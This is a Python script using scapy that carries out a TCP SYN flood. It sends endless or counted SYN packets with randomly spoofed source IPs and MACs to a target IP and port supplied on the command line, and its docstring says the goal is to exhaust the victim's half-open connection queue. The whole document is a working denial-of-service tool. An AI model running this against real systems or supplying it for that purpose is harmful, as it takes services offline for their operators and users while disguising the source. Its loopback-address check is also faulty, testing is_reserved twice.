#!/usr/bin/env python3
import random
import argparse
import sys
import re
import ipaddress
import logging
import time

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *

conf.verb = 0


def get_mac_by_ip(ip):

	print('[ INFO ] resolving MAC address for [ %s ] ...' % ip, end = '\r', flush = True)
	responses, unanswered = srp(\
		Ether(dst = "ff:ff:ff:ff:ff:ff")/\
			ARP(pdst = ip), timeout = 2, retry = 10)
	# return the MAC address from a response
	for s,r in responses:
		print(r[Ether].src)
		return r[Ether].src
	return None

def tcp_syn_flood(ip, mac, port, iface, n):
	"""
	Through this attack, attackers can flood the victim’s queue that is used for half-opened connections,
	i.e. the connections that has finished SYN, SYN-ACK, but has not yet got a final ACK back. 
	When this queue is full, the victim cannot take any more connection.
	"""

	if n:
		for i in range(n):
			spoofed_mac = ':'.join([ hex(i).lstrip('0x').rjust(2,'0') for i in random.sample(range(0x0, 0xff),6)])
			spoofed_ip  = "{}.{}.{}.{}".format(*random.sample(range(1,254),4))
			# send a packet at Layer 2
			sendp(\
				Ether(dst = mac, src = spoofed_mac)/\
					IP(dst=ip, src = spoofed_ip)/\
						TCP(dport = port, sport = random.randint(1024, 65535), flags = 'S')\
						, iface = iface)
	else:
		# infinitely
		while True:
			spoofed_mac = ':'.join([ hex(i).lstrip('0x').rjust(2,'0') for i in random.sample(range(0x0, 0xff),6)])
			spoofed_ip  = "{}.{}.{}.{}".format(*random.sample(range(1,254),4))
			# send a packet at Layer 2
			sendp(\
				Ether(dst = mac, src = spoofed_mac)/\
					IP(dst = ip, src = spoofed_ip)/\
						TCP(dport = port, sport = random.randint(1024, 65535), flags = 'S')\
						, iface = iface)


def parse_argv(argv):
	"""
	Parse Command Line Arguments
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument('-p', '--port', type=int, dest='port', required=True, help='Destination port number')
	parser.add_argument('-a', '--host', type=str, dest='host', required=True, help='Destination Ip address')
	parser.add_argument('-n', '--pkt-count', type=int, dest='n', default=0, help='Number of TCP SYN packets to send')
	parser.add_argument('-i', '--iface', type=str, dest='iface', required=True, help='Interface card name')

	try:
		res  = parser.parse_args(argv)
		err  = False
		if not re.match("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", res.host):
			print('[ ERROR ] -- Invalid Ip Address')
			err = True

		if res.port < 1 or res.port > 65535:
			print('\033[91m [ ERROR ] -- Invalid Port No. [ 1 <= port <= 65535 ]')
			err = True

		if not err:
			ip_addr = ipaddress.ip_address(res.host)
			if ip_addr.is_reserved:
				print('[ ERROR ] -- Cannot use a Loop-back address')
				sys.exit()
			elif ip_addr.is_reserved:
				print('[ ERROR ] -- Cannot use a Reserved address')
				sys.exit()

			mac = getmacbyip(res.host) #get_mac_by_ip(ip_addr.exploded)
			return (ip_addr.exploded, mac, res.port, res.iface, res.n)
		else:
			sys.exit()
	except:
		sys.exit()

if __name__ == '__main__':

	ip, mac, port, iface, n = parse_argv(sys.argv[1:])
	if mac:
		tcp_syn_flood(ip = ip, mac = mac, port = port, iface = iface, n = n)
	else:
		print('[ ERROR ] -- Could not resolve MAC address for [ %s ]' % ip)